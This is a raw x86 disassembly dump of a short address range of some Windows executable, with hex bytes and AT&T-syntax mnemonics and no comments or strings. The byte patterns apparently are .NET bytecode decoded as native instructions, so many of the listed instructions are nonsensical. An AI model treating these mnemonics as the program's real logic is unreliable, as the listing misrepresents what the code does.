  40306f:	09 0f                	or     %ecx,(%edi)
  403071:	00 28                	add    %ch,(%eax)
  403073:	86 01                	xchg   %al,(%ecx)
  403075:	00 06                	add    %al,(%esi)
  403077:	2c 0c                	sub    $0xc,%al
  403079:	02 7b bb             	add    -0x45(%ebx),%bh
  40307c:	00 00                	add    %al,(%eax)
  40307e:	04 75                	add    $0x75,%al
  403080:	55                   	push   %ebp
  403081:	00 00                	add    %al,(%eax)
  403083:	01 2a                	add    %ebp,(%edx)
  403085:	14 2a                	adc    $0x2a,%al
  403087:	82 0f 00             	orb    $0x0,(%edi)
  40308a:	28 8b 01 00 06 2d    	sub    %cl,0x2d060001(%ebx)
  403090:	09 0f                	or     %ecx,(%edi)
  403092:	00 28                	add    %ch,(%eax)
  403094:	86 01                	xchg   %al,(%ecx)
  403096:	00 06                	add    %al,(%esi)
  403098:	2c 0c                	sub    $0xc,%al
  40309a:	02 7b bb             	add    -0x45(%ebx),%bh
  40309d:	00 00                	add    %al,(%eax)
  40309f:	04 75                	add    $0x75,%al
  4030a1:	29 00                	sub    %eax,(%eax)
  4030a3:	00 02                	add    %al,(%edx)
  4030a5:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  4030a8:	82 0f 00             	orb    $0x0,(%edi)
  4030ab:	28 8c 01 00 06 2d 09 	sub    %cl,0x92d0600(%ecx,%eax,1)
  4030b2:	0f 00 28             	verw   (%eax)
  4030b5:	86 01                	xchg   %al,(%ecx)
  4030b7:	00 06                	add    %al,(%esi)
  4030b9:	2c 0c                	sub    $0xc,%al
  4030bb:	02 7b bb             	add    -0x45(%ebx),%bh
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	04 75                	add    $0x75,%al
  4030c2:	27                   	daa
  4030c3:	00 00                	add    %al,(%eax)
  4030c5:	02 2a                	add    (%edx),%ch
  4030c7:	14 2a                	adc    $0x2a,%al
  4030c9:	ca 0f 00             	lret   $0xf
  4030cc:	28 85 01 00 06 0f    	sub    %al,0xf060001(%ebp)
  4030d2:	01 28                	add    %ebp,(%eax)
  4030d4:	85 01                	test   %eax,(%ecx)
  4030d6:	00 06                	add    %al,(%esi)
  4030d8:	33 20                	xor    (%eax),%esp
  4030da:	02 7b bc             	add    -0x44(%ebx),%bh
  4030dd:	00 00                	add    %al,(%eax)
  4030df:	04 03                	add    $0x3,%al
  4030e1:	7b bc                	jnp    0x40309f
  4030e3:	00 00                	add    %al,(%eax)
  4030e5:	04 33                	add    $0x33,%al
  4030e7:	12 02                	adc    (%edx),%al
  4030e9:	7b bb                	jnp    0x4030a6
  4030eb:	00 00                	add    %al,(%eax)
  4030ed:	04 03                	add    $0x3,%al
  4030ef:	7b bb                	jnp    0x4030ac
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	04 28                	add    $0x28,%al
  4030f5:	e1 01                	loope  0x4030f8
  4030f7:	00 0a                	add    %cl,(%edx)
  4030f9:	2a 16                	sub    (%esi),%dl
  4030fb:	2a 2e                	sub    (%esi),%ch
  4030fd:	02 03                	add    (%ebx),%al
  4030ff:	28 b1 01 00 06 16    	sub    %dh,0x16060001(%ecx)
  403105:	fe 01                	incb   (%ecx)
  403107:	2a 1e                	sub    (%esi),%bl
  403109:	02 28                	add    (%eax),%ch
  40310b:	d6                   	salc
  40310c:	01 00                	add    %eax,(%eax)
  40310e:	06                   	push   %es
  40310f:	2a 22                	sub    (%edx),%ah
  403111:	02 16                	add    (%esi),%dl
  403113:	28 b7 01 00 06 2a    	sub    %dh,0x2a060001(%edi)
  403119:	36 02 71 2c          	add    %ss:0x2c(%ecx),%dh
  40311d:	00 00                	add    %al,(%eax)
  40311f:	02 03                	add    (%ebx),%al
  403121:	28 fa                	sub    %bh,%dl
  403123:	01 00                	add    %eax,(%eax)
  403125:	06                   	push   %es
  403126:	2a 5a 16             	sub    0x16(%edx),%bl
  403129:	23 00                	and    (%eax),%eax
  40312b:	00 00                	add    %al,(%eax)
  40312d:	00 00                	add    %al,(%eax)
  40312f:	00 00                	add    %al,(%eax)
  403131:	00 14 73             	add    %dl,(%ebx,%esi,2)
  403134:	9a 01 00 06 80 bd 00 	lcall  $0xbd,$0x80060001
  40313b:	00 04 2a             	add    %al,(%edx,%ebp,1)
  40313e:	82 02 7c             	addb   $0x7c,(%edx)
  403141:	be 00 00 04 28       	mov    $0x28040000,%esi
  403146:	8b 01                	mov    (%ecx),%eax
  403148:	00 06                	add    %al,(%esi)
  40314a:	2c 11                	sub    $0x11,%al
  40314c:	02 7c be 00          	add    0x0(%esi,%edi,4),%bh
  403150:	00 04 7b             	add    %al,(%ebx,%edi,2)
  403153:	bb 00 00 04 74       	mov    $0x74040000,%ebx
  403158:	29 00                	sub    %eax,(%eax)
  40315a:	00 02                	add    %al,(%edx)
  40315c:	2a 14 2a             	sub    (%edx,%ebp,1),%dl
  40315f:	82 02 7c             	addb   $0x7c,(%edx)
  403162:	be 00 00 04 28       	mov    $0x28040000,%esi
  403167:	8c 01                	mov    %es,(%ecx)
  403169:	00 06                	add    %al,(%esi)
  40316b:	2c 11                	sub    $0x11,%al
  40316d:	02 7c be 00          	add    0x0(%esi,%edi,4),%bh
  403171:	00 04 7b             	add    %al,(%ebx,%edi,2)
  403174:	bb 00 00 04 74       	mov    $0x74040000,%ebx
  403179:	27                   	daa
  40317a:	00 00                	add    %al,(%eax)
  40317c:	02 2a                	add    (%edx),%ch
  40317e:	14 2a                	adc    $0x2a,%al
  403180:	32 02                	xor    (%edx),%al
  403182:	7c be                	jl     0x403142
  403184:	00 00                	add    %al,(%eax)
  403186:	04 28                	add    $0x28,%al
  403188:	85 01                	test   %eax,(%ecx)
  40318a:	00 06                	add    %al,(%esi)
  40318c:	2a 3a                	sub    (%edx),%bh
  40318e:	02 28                	add    (%eax),%ch
  403190:	03 01                	add    (%ecx),%eax
  403192:	00 0a                	add    %cl,(%edx)
  403194:	02 03                	add    (%ebx),%al
  403196:	7d be                	jge    0x403156
  403198:	00 00                	add    %al,(%eax)
  40319a:	04 2a                	add    $0x2a,%al
  40319c:	1e                   	push   %ds
  40319d:	02 7b c6             	add    -0x3a(%ebx),%bh
  4031a0:	00 00                	add    %al,(%eax)
  4031a2:	04 2a                	add    $0x2a,%al
  4031a4:	22 02                	and    (%edx),%al
  4031a6:	03 7d c6             	add    -0x3a(%ebp),%edi
  4031a9:	00 00                	add    %al,(%eax)
  4031ab:	04 2a                	add    $0x2a,%al
  4031ad:	1e                   	push   %ds
  4031ae:	02 7b c7             	add    -0x39(%ebx),%bh
  4031b1:	00 00                	add    %al,(%eax)
  4031b3:	04 2a                	add    $0x2a,%al
  4031b5:	22 02                	and    (%edx),%al
  4031b7:	03 7d c7             	add    -0x39(%ebp),%edi
  4031ba:	00 00                	add    %al,(%eax)
  4031bc:	04 2a                	add    $0x2a,%al
  4031be:	36 02 16             	add    %ss:(%esi),%dl
  4031c1:	28 c5                	sub    %al,%ch
  4031c3:	01 00                	add    %eax,(%eax)
  4031c5:	06                   	push   %es
  4031c6:	28 79 01             	sub    %bh,0x1(%ecx)
  4031c9:	00 0a                	add    %cl,(%edx)
  4031cb:	2a 3e                	sub    (%esi),%bh
  4031cd:	02 03                	add    (%ebx),%al
  4031cf:	28 c5                	sub    %al,%ch
  4031d1:	01 00                	add    %eax,(%eax)
  4031d3:	06                   	push   %es
  4031d4:	03 04 28             	add    (%eax,%ebp,1),%eax
  4031d7:	c4 01                	les    (%ecx),%eax
  4031d9:	00 06                	add    %al,(%esi)
  4031db:	2a 5a 02             	sub    0x2(%edx),%bl
  4031de:	03 28                	add    (%eax),%ebp
  4031e0:	79 01                	jns    0x4031e3
  4031e2:	00 0a                	add    %cl,(%edx)
  4031e4:	02 04 28             	add    (%eax,%ebp,1),%al
  4031e7:	c1 01 00             	roll   $0x0,(%ecx)
  4031ea:	06                   	push   %es
  4031eb:	02 05 28 bf 01 00    	add    0x1bf28,%al
  4031f1:	06                   	push   %es
  4031f2:	2a ba 02 17 59 45    	sub    0x45591702(%edx),%bh
  4031f8:	03 00                	add    (%eax),%eax
  4031fa:	00 00                	add    %al,(%eax)
  4031fc:	02 00                	add    (%eax),%al
  4031fe:	00 00                	add    %al,(%eax)
  403200:	0e                   	push   %cs
  403201:	00 00                	add    %al,(%eax)
  403203:	00 08                	add    %cl,(%eax)
  403205:	00 00                	add    %al,(%eax)
  403207:	00 2b                	add    %ch,(%ebx)
  403209:	12 72 2f             	adc    0x2f(%edx),%dh
  40320c:	1a 00                	sbb    (%eax),%al
  40320e:	70 2a                	jo     0x40323a
  403210:	72 91                	jb     0x4031a3
  403212:	1a 00                	sbb    (%eax),%al
  403214:	70 2a                	jo     0x403240
  403216:	72 07                	jb     0x40321f
  403218:	1b 00                	sbb    (%eax),%eax
  40321a:	70 2a                	jo     0x403246
  40321c:	72 79                	jb     0x403297
  40321e:	1b 00                	sbb    (%eax),%eax
  403220:	70 2a                	jo     0x40324c
  403222:	4e                   	dec    %esi
  403223:	02 28                	add    (%eax),%ch
  403225:	03 01                	add    (%ecx),%eax
  403227:	00 0a                	add    %cl,(%edx)
  403229:	02 03                	add    (%ebx),%al
  40322b:	73 fd                	jae    0x40322a
  40322d:	01 00                	add    %eax,(%eax)
  40322f:	06                   	push   %es
  403230:	7d cd                	jge    0x4031ff
  403232:	00 00                	add    %al,(%eax)
  403234:	04 2a                	add    $0x2a,%al
  403236:	1e                   	push   %ds
  403237:	02 28                	add    (%eax),%ch
  403239:	cd 01                	int    $0x1
  40323b:	00 06                	add    %al,(%esi)
  40323d:	2a 5a 02             	sub    0x2(%edx),%bl
  403240:	7b cd                	jnp    0x40320f
  403242:	00 00                	add    %al,(%eax)
  403244:	04 72                	add    $0x72,%al
  403246:	d1 07                	roll   $1,(%edi)
  403248:	00 70 6f             	add    %dh,0x6f(%eax)
  40324b:	02 02                	add    (%edx),%al
  40324d:	00 06                	add    %al,(%esi)
  40324f:	7e bd                	jle    0x40320e
  403251:	00 00                	add    %al,(%eax)
  403253:	04 2a                	add    $0x2a,%al
  403255:	d2 2b                	shrb   %cl,(%ebx)
  403257:	12 03                	adc    (%ebx),%al
  403259:	02 7b cd             	add    -0x33(%ebx),%bh
  40325c:	00 00                	add    %al,(%eax)
  40325e:	04 6f                	add    $0x6f,%al
  403260:	ff 01                	incl   (%ecx)
  403262:	00 06                	add    %al,(%esi)
  403264:	6f                   	outsl  %ds:(%esi),(%dx)
  403265:	92                   	xchg   %eax,%edx
  403266:	00 00                	add    %al,(%eax)
  403268:	0a 26                	or     (%esi),%ah
  40326a:	02 7b cd             	add    -0x33(%ebx),%bh
  40326d:	00 00                	add    %al,(%eax)
  40326f:	04 6f                	add    $0x6f,%al
  403271:	fc                   	cld
  403272:	01 00                	add    %eax,(%eax)
  403274:	06                   	push   %es
  403275:	2c 12                	sub    $0x12,%al
  403277:	02 7b cd             	add    -0x33(%ebx),%bh
  40327a:	00 00                	add    %al,(%eax)
  40327c:	04 6f                	add    $0x6f,%al
  40327e:	fe 01                	incb   (%ecx)
  403280:	00 06                	add    %al,(%esi)
  403282:	28 60 01             	sub    %ah,0x1(%eax)
  403285:	00 0a                	add    %cl,(%edx)
  403287:	2d cf 2a ba 16       	sub    $0x16ba2acf,%eax
  40328c:	02 28                	add    (%eax),%ch
  40328e:	ce                   	into
  40328f:	01 00                	add    %eax,(%eax)
  403291:	06                   	push   %es
  403292:	20 00                	and    %al,(%eax)
  403294:	10 00                	adc    %al,(%eax)
  403296:	00 5a 58             	add    %bl,0x58(%edx)
  403299:	02 28                	add    (%eax),%ch
  40329b:	ce                   	into
  40329c:	01 00                	add    %eax,(%eax)
  40329e:	06                   	push   %es
  40329f:	20 00                	and    %al,(%eax)
  4032a1:	01 00                	add    %eax,(%eax)
  4032a3:	00 5a 58             	add    %bl,0x58(%edx)
  4032a6:	02 28                	add    (%eax),%ch
  4032a8:	ce                   	into
  4032a9:	01 00                	add    %eax,(%eax)
  4032ab:	06                   	push   %es
  4032ac:	1f                   	pop    %ds
  4032ad:	10 5a 58             	adc    %bl,0x58(%edx)
  4032b0:	02 28                	add    (%eax),%ch
  4032b2:	ce                   	into
  4032b3:	01 00                	add    %eax,(%eax)
  4032b5:	06                   	push   %es
  4032b6:	58                   	pop    %eax
  4032b7:	d1 2a                	shrl   $1,(%edx)
  4032b9:	32 02                	xor    (%edx),%al
  4032bb:	73 71                	jae    0x40332e
  4032bd:	01 00                	add    %eax,(%eax)
  4032bf:	06                   	push   %es
  4032c0:	28 d1                	sub    %dl,%cl
  4032c2:	01 00                	add    %eax,(%eax)
  4032c4:	06                   	push   %es
  4032c5:	2a 32                	sub    (%edx),%dh
  4032c7:	02 73 5e             	add    0x5e(%ebx),%dh
  4032ca:	01 00                	add    %eax,(%eax)
  4032cc:	06                   	push   %es
  4032cd:	28 d3                	sub    %dl,%bl
  4032cf:	01 00                	add    %eax,(%eax)
  4032d1:	06                   	push   %es
  4032d2:	2a 4a 02             	sub    0x2(%edx),%cl
  4032d5:	7b cd                	jnp    0x4032a4
  4032d7:	00 00                	add    %al,(%eax)
  4032d9:	04 6f                	add    $0x6f,%al
  4032db:	00 02                	add    %al,(%edx)
  4032dd:	00 06                	add    %al,(%esi)
  4032df:	02 28                	add    (%eax),%ch
  4032e1:	c8 01 00 06          	enter  $0x1,$0x6
  4032e5:	2a 6a 02             	sub    0x2(%edx),%ch
  4032e8:	2d 0b 72 6b 00       	sub    $0x6b720b,%eax
  4032ed:	00 70 73             	add    %dh,0x73(%eax)
  4032f0:	4b                   	dec    %ebx
  4032f1:	00 00                	add    %al,(%eax)
  4032f3:	0a 7a 02             	or     0x2(%edx),%bh
  4032f6:	73 c6                	jae    0x4032be
  4032f8:	01 00                	add    %eax,(%eax)
  4032fa:	06                   	push   %es
  4032fb:	28 d4                	sub    %dl,%ah
  4032fd:	01 00                	add    %eax,(%eax)
  4032ff:	06                   	push   %es
  403300:	2a 1e                	sub    (%esi),%bl
  403302:	02 7b ce             	add    -0x32(%ebx),%bh
  403305:	00 00                	add    %al,(%eax)
  403307:	04 2a                	add    $0x2a,%al
  403309:	22 02                	and    (%edx),%al
  40330b:	03 7d ce             	add    -0x32(%ebp),%edi
  40330e:	00 00                	add    %al,(%eax)
  403310:	04 2a                	add    $0x2a,%al
  403312:	36 02 16             	add    %ss:(%esi),%dl
  403315:	28 dd                	sub    %bl,%ch
  403317:	01 00                	add    %eax,(%eax)
  403319:	06                   	push   %es
  40331a:	28 79 01             	sub    %bh,0x1(%ecx)
  40331d:	00 0a                	add    %cl,(%edx)
  40331f:	2a 3a                	sub    (%edx),%bh
  403321:	02 03                	add    (%ebx),%al
  403323:	28 dd                	sub    %bl,%ch
  403325:	01 00                	add    %eax,(%eax)
  403327:	06                   	push   %es
  403328:	03 28                	add    (%eax),%ebp
  40332a:	dc 01                	faddl  (%ecx)
  40332c:	00 06                	add    %al,(%esi)
  40332e:	2a 3e                	sub    (%esi),%bh
  403330:	02 03                	add    (%ebx),%al
  403332:	28 79 01             	sub    %bh,0x1(%ecx)
  403335:	00 0a                	add    %cl,(%edx)
  403337:	02 04 28             	add    (%eax,%ebp,1),%al
  40333a:	d9 01                	flds   (%ecx)
  40333c:	00 06                	add    %al,(%esi)
  40333e:	2a ba 02 17 59 45    	sub    0x45591702(%edx),%bh
  403344:	03 00                	add    (%eax),%eax
  403346:	00 00                	add    %al,(%eax)
  403348:	02 00                	add    (%eax),%al
  40334a:	00 00                	add    %al,(%eax)
  40334c:	08 00                	or     %al,(%eax)
  40334e:	00 00                	add    %al,(%eax)
  403350:	0e                   	push   %cs
  403351:	00 00                	add    %al,(%eax)
  403353:	00 2b                	add    %ch,(%ebx)
  403355:	12 72 f5             	adc    -0xb(%edx),%dh
  403358:	1b 00                	sbb    (%eax),%eax
  40335a:	70 2a                	jo     0x403386
  40335c:	72 8e                	jb     0x4032ec
  40335e:	1c 00                	sbb    $0x0,%al
  403360:	70 2a                	jo     0x40338c
  403362:	72 11                	jb     0x403375
  403364:	1d 00 70 2a 72       	sbb    $0x722a7000,%eax
  403369:	81 1d 00 70 2a 1e 02 	sbbl   $0xd77b02,0x1e2a7000
  403370:	7b d7 00 
  403373:	00 04 2a             	add    %al,(%edx,%ebp,1)
  403376:	22 02                	and    (%edx),%al
  403378:	03 7d d7             	add    -0x29(%ebp),%edi
  40337b:	00 00                	add    %al,(%eax)
  40337d:	04 2a                	add    $0x2a,%al
  40337f:	1e                   	push   %ds
  403380:	02 7b d8             	add    -0x28(%ebx),%bh
  403383:	00 00                	add    %al,(%eax)
  403385:	04 2a                	add    $0x2a,%al
  403387:	22 02                	and    (%edx),%al
  403389:	03 7d d8             	add    -0x28(%ebp),%edi
  40338c:	00 00                	add    %al,(%eax)
  40338e:	04 2a                	add    $0x2a,%al
  403390:	1e                   	push   %ds
  403391:	02 7b d9             	add    -0x27(%ebx),%bh
  403394:	00 00                	add    %al,(%eax)
  403396:	04 2a                	add    $0x2a,%al
  403398:	22 02                	and    (%edx),%al
  40339a:	03 7d d9             	add    -0x27(%ebp),%edi
  40339d:	00 00                	add    %al,(%eax)
  40339f:	04 2a                	add    $0x2a,%al
  4033a1:	1e                   	push   %ds
  4033a2:	02 7b da             	add    -0x26(%ebx),%bh
  4033a5:	00 00                	add    %al,(%eax)
  4033a7:	04 2a                	add    $0x2a,%al
  4033a9:	22 02                	and    (%edx),%al
  4033ab:	03 7d da             	add    -0x26(%ebp),%edi
  4033ae:	00 00                	add    %al,(%eax)
  4033b0:	04 2a                	add    $0x2a,%al
  4033b2:	1e                   	push   %ds
  4033b3:	02 7b db             	add    -0x25(%ebx),%bh
  4033b6:	00 00                	add    %al,(%eax)
  4033b8:	04 2a                	add    $0x2a,%al
  4033ba:	22 02                	and    (%edx),%al
  4033bc:	03 7d db             	add    -0x25(%ebp),%edi
  4033bf:	00 00                	add    %al,(%eax)
  4033c1:	04 2a                	add    $0x2a,%al
  4033c3:	26 02 03             	add    %es:(%ebx),%al
  4033c6:	16                   	push   %ss
  4033c7:	28 e9                	sub    %ch,%cl
  4033c9:	01 00                	add    %eax,(%eax)
  4033cb:	06                   	push   %es
  4033cc:	2a f6                	sub    %dh,%dh
  4033ce:	02 28                	add    (%eax),%ch
  4033d0:	03 01                	add    (%ecx),%eax
  4033d2:	00 0a                	add    %cl,(%edx)
  4033d4:	04 2c                	add    $0x2c,%al
  4033d6:	21 02                	and    %eax,(%edx)
  4033d8:	72 d1                	jb     0x4033ab
  4033da:	1d 00 70 28 df       	sbb    $0xdf287000,%eax
  4033df:	01 00                	add    %eax,(%eax)
  4033e1:	06                   	push   %es
  4033e2:	02 72 ed             	add    -0x13(%edx),%dh
  4033e5:	0b 00                	or     (%eax),%eax
  4033e7:	70 28                	jo     0x403411
  4033e9:	e1 01                	loope  0x4033ec
  4033eb:	00 06                	add    %al,(%esi)
  4033ed:	02 72 d5             	add    -0x2b(%edx),%dh
  4033f0:	1d 00 70 28 e3       	sbb    $0xe3287000,%eax
  4033f5:	01 00                	add    %eax,(%eax)
  4033f7:	06                   	push   %es
  4033f8:	02 73 ed             	add    -0x13(%ebx),%dh
  4033fb:	01 00                	add    %eax,(%eax)
  4033fd:	0a 7d d6             	or     -0x2a(%ebp),%bh
  403400:	00 00                	add    %al,(%eax)
  403402:	04 02                	add    $0x2,%al
  403404:	03 28                	add    (%eax),%ebp
  403406:	e7 01                	out    %eax,$0x1
  403408:	00 06                	add    %al,(%esi)
  40340a:	2a 8a 02 7b d5 00    	sub    0xd57b02(%edx),%cl
  403410:	00 04 2c             	add    %al,(%esp,%ebp,1)
  403413:	0d 02 16 7d d5       	or     $0xd57d1602,%eax
  403418:	00 00                	add    %al,(%eax)
  40341a:	04 02                	add    $0x2,%al
  40341c:	28 ed                	sub    %ch,%ch
  40341e:	01 00                	add    %eax,(%eax)
  403420:	06                   	push   %es
  403421:	02 28                	add    (%eax),%ch
  403423:	e6 01                	out    %al,$0x1
  403425:	00 06                	add    %al,(%esi)
  403427:	03 6f 4c             	add    0x4c(%edi),%ebp
  40342a:	00 00                	add    %al,(%eax)
  40342c:	0a 2a                	or     (%edx),%ch
  40342e:	36 02 02             	add    %ss:(%edx),%al
  403431:	28 e0                	sub    %ah,%al
  403433:	01 00                	add    %eax,(%eax)
  403435:	06                   	push   %es
  403436:	28 ea                	sub    %ch,%dl
  403438:	01 00                	add    %eax,(%eax)
  40343a:	06                   	push   %es
  40343b:	2a 52 02             	sub    0x2(%edx),%dl
  40343e:	02 28                	add    (%eax),%ch
  403440:	e2 01                	loop   0x403443
  403442:	00 06                	add    %al,(%esi)
  403444:	28 ea                	sub    %ch,%dl
  403446:	01 00                	add    %eax,(%eax)
  403448:	06                   	push   %es
  403449:	02 17                	add    (%edi),%dl
  40344b:	7d d5                	jge    0x403422
  40344d:	00 00                	add    %al,(%eax)
  40344f:	04 2a                	add    $0x2a,%al
  403451:	3a 02                	cmp    (%edx),%al
  403453:	03 28                	add    (%eax),%ebp
  403455:	ea 01 00 06 02 28 ef 	ljmp   $0xef28,$0x2060001
  40345c:	01 00                	add    %eax,(%eax)
  40345e:	06                   	push   %es
  40345f:	2a 5a 02             	sub    0x2(%edx),%bl
  403462:	7b d6                	jnp    0x40343a
  403464:	00 00                	add    %al,(%eax)
  403466:	04 03                	add    $0x3,%al
  403468:	6f                   	outsl  %ds:(%esi),(%dx)
  403469:	f0 01 00             	lock add %eax,(%eax)
  40346c:	0a 2d 07 19 73 db    	or     0xdb731907,%ch
  403472:	01 00                	add    %eax,(%eax)
  403474:	06                   	push   %es
  403475:	7a 2a                	jp     0x4034a1
  403477:	3a 02                	cmp    (%edx),%al
  403479:	7b d6                	jnp    0x403451
  40347b:	00 00                	add    %al,(%eax)
  40347d:	04 03                	add    $0x3,%al
  40347f:	6f                   	outsl  %ds:(%esi),(%dx)
  403480:	f1                   	int1
  403481:	01 00                	add    %eax,(%eax)
  403483:	0a 26                	or     (%esi),%ah
  403485:	2a 86 02 16 7d d4    	sub    -0x2b82e9fe(%esi),%al
  40348b:	00 00                	add    %al,(%eax)
  40348d:	04 02                	add    $0x2,%al
  40348f:	17                   	pop    %ss
  403490:	7d d5                	jge    0x403467
  403492:	00 00                	add    %al,(%eax)
  403494:	04 02                	add    $0x2,%al
  403496:	03 28                	add    (%eax),%ebp
  403498:	f3 01 00             	repz add %eax,(%eax)
  40349b:	06                   	push   %es
  40349c:	02 7b d6             	add    -0x2a(%ebx),%bh
  40349f:	00 00                	add    %al,(%eax)
  4034a1:	04 6f                	add    $0x6f,%al
  4034a3:	f7 01 00 0a 2a 52    	testl  $0x522a0a00,(%ecx)
  4034a9:	02 28                	add    (%eax),%ch
  4034ab:	c5 00                	lds    (%eax),%eax
  4034ad:	00 0a                	add    %cl,(%edx)
  4034af:	2d 0a 02 28 c4       	sub    $0xc428020a,%eax
  4034b4:	00 00                	add    %al,(%eax)
  4034b6:	0a 16                	or     (%esi),%dl
  4034b8:	fe 01                	incb   (%ecx)
  4034ba:	2a 16                	sub    (%esi),%dl
  4034bc:	2a 22                	sub    (%edx),%ah
  4034be:	02 16                	add    (%esi),%dl
  4034c0:	28 fa                	sub    %bh,%dl
  4034c2:	01 00                	add    %eax,(%eax)
  4034c4:	06                   	push   %es
  4034c5:	2a 1e                	sub    (%esi),%bl
  4034c7:	02 7b df             	add    -0x21(%ebx),%bh
  4034ca:	00 00                	add    %al,(%eax)
  4034cc:	04 2a                	add    $0x2a,%al
  4034ce:	4a                   	dec    %edx
  4034cf:	02 7b de             	add    -0x22(%ebx),%bh
  4034d2:	00 00                	add    %al,(%eax)
  4034d4:	04 6f                	add    $0x6f,%al
  4034d6:	86 00                	xchg   %al,(%eax)
  4034d8:	00 0a                	add    %cl,(%edx)
  4034da:	15 fe 01 16 fe       	adc    $0xfe1601fe,%eax
  4034df:	01 2a                	add    %ebp,(%edx)
  4034e1:	76 02                	jbe    0x4034e5
  4034e3:	28 03                	sub    %al,(%ebx)
  4034e5:	01 00                	add    %eax,(%eax)
  4034e7:	0a 02                	or     (%edx),%al
  4034e9:	03 25 2d 0c 26 72    	add    0x72260c2d,%esp
  4034ef:	6b 00 00             	imul   $0x0,(%eax),%eax
  4034f2:	70 73                	jo     0x403567
  4034f4:	4b                   	dec    %ebx
  4034f5:	00 00                	add    %al,(%eax)
  4034f7:	0a 7a 7d             	or     0x7d(%edx),%bh
  4034fa:	de 00                	fiadds (%eax)
  4034fc:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4034ff:	7a 02                	jp     0x403503
  403501:	7b de                	jnp    0x4034e1
  403503:	00 00                	add    %al,(%eax)
  403505:	04 6f                	add    $0x6f,%al
  403507:	86 00                	xchg   %al,(%eax)
  403509:	00 0a                	add    %cl,(%edx)
  40350b:	25 15 33 0d 17       	and    $0x170d3315,%eax
  403510:	02 7b df             	add    -0x21(%ebx),%bh
  403513:	00 00                	add    %al,(%eax)
  403515:	04 73                	add    $0x73,%al
  403517:	c3                   	ret
  403518:	01 00                	add    %eax,(%eax)
  40351a:	06                   	push   %es
  40351b:	7a d1                	jp     0x4034ee
  40351d:	2a 5e 2b             	sub    0x2b(%esi),%bl
  403520:	07                   	pop    %es
  403521:	02 28                	add    (%eax),%ch
  403523:	ff 01                	incl   (%ecx)
  403525:	00 06                	add    %al,(%esi)
  403527:	26 02 28             	add    %es:(%eax),%ch
  40352a:	fe 01                	incb   (%ecx)
  40352c:	00 06                	add    %al,(%esi)
  40352e:	28 a9 00 00 0a 2d    	sub    %ch,0x2d0a0000(%ecx)
  403534:	ec                   	in     (%dx),%al
  403535:	2a ba 02 28 fe 01    	sub    0x1fe2802(%edx),%bh
  40353b:	00 06                	add    %al,(%esi)
  40353d:	03 33                	add    (%ebx),%esi
  40353f:	08 02                	or     %al,(%edx)
  403541:	28 ff                	sub    %bh,%bh
  403543:	01 00                	add    %eax,(%eax)
  403545:	06                   	push   %es
  403546:	26 2a 72 5d          	sub    %es:0x5d(%edx),%dh
  40354a:	1e                   	push   %ds
  40354b:	00 70 03             	add    %dh,0x3(%eax)
  40354e:	8c 68 00             	mov    %gs,0x0(%eax)
  403551:	00 01                	add    %al,(%ecx)
  403553:	28 ef                	sub    %ch,%bh
  403555:	01 00                	add    %eax,(%eax)
  403557:	0a 19                	or     (%ecx),%bl
  403559:	02 7b df             	add    -0x21(%ebx),%bh
  40355c:	00 00                	add    %al,(%eax)
  40355e:	04 73                	add    $0x73,%al
  403560:	c4 01                	les    (%ecx),%eax
  403562:	00 06                	add    %al,(%esi)
  403564:	7a 00                	jp     0x403566
  403566:	00 00                	add    %al,(%eax)
  403568:	13 30                	adc    (%eax),%esi
  40356a:	07                   	pop    %es
  40356b:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40356f:	00 01                	add    %al,(%ecx)
  403571:	00 00                	add    %al,(%eax)
  403573:	11 00                	adc    %eax,(%eax)
  403575:	d0 53 00             	rclb   $1,0x0(%ebx)
  403578:	00 01                	add    %al,(%ecx)
  40357a:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40357d:	00 0a                	add    %cl,(%edx)
  40357f:	72 01                	jb     0x403582
  403581:	00 00                	add    %al,(%eax)
  403583:	70 17                	jo     0x40359c
  403585:	8d 06                	lea    (%esi),%eax
  403587:	00 00                	add    %al,(%eax)
  403589:	01 25 16 d0 55 00    	add    %esp,0x55d016
  40358f:	00 01                	add    %al,(%ecx)
  403591:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  403594:	00 0a                	add    %cl,(%edx)
  403596:	a2 6f 3d 00 00       	mov    %al,0x3d6f
  40359b:	0a 0a                	or     (%edx),%cl
  40359d:	06                   	push   %es
  40359e:	2c 27                	sub    $0x27,%al
  4035a0:	72 2f                	jb     0x4035d1
  4035a2:	00 00                	add    %al,(%eax)
  4035a4:	70 06                	jo     0x4035ac
  4035a6:	14 17                	adc    $0x17,%al
  4035a8:	8d 02                	lea    (%edx),%eax
  4035aa:	00 00                	add    %al,(%eax)
  4035ac:	01 25 16 72 33 00    	add    %esp,0x337216
  4035b2:	00 70 a2             	add    %dh,-0x5e(%eax)
  4035b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4035b6:	3e 00 00             	add    %al,%ds:(%eax)
  4035b9:	0a 6f 3f             	or     0x3f(%edi),%ch
  4035bc:	00 00                	add    %al,(%eax)
  4035be:	0a 2c 06             	or     (%esi,%eax,1),%ch
  4035c1:	14 28                	adc    $0x28,%al
  4035c3:	40                   	inc    %eax
  4035c4:	00 00                	add    %al,(%eax)
  4035c6:	0a 14 fe             	or     (%esi,%edi,8),%dl
  4035c9:	06                   	push   %es
  4035ca:	02 00                	add    (%eax),%al
  4035cc:	00 06                	add    %al,(%esi)
  4035ce:	73 41                	jae    0x403611
  4035d0:	00 00                	add    %al,(%eax)
  4035d2:	0a 73 42             	or     0x42(%ebx),%dh
  4035d5:	00 00                	add    %al,(%eax)
  4035d7:	0a 25 17 6f 43 00    	or     0x436f17,%ah
  4035dd:	00 0a                	add    %cl,(%edx)
  4035df:	14 6f                	adc    $0x6f,%al
  4035e1:	44                   	inc    %esp
  4035e2:	00 00                	add    %al,(%eax)
  4035e4:	0a 2b                	or     (%ebx),%ch
  4035e6:	00 2a                	add    %ch,(%edx)
  4035e8:	13 30                	adc    (%eax),%esi
  4035ea:	02 00                	add    (%eax),%al
  4035ec:	66 00 00             	data16 add %al,(%eax)
  4035ef:	00 02                	add    %al,(%edx)
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	11 02                	adc    %eax,(%edx)
  4035f5:	75 58                	jne    0x40364f
  4035f7:	00 00                	add    %al,(%eax)
  4035f9:	01 0a                	add    %ecx,(%edx)
  4035fb:	06                   	push   %es
  4035fc:	2d 2e 14 fe 06       	sub    $0x6fe142e,%eax
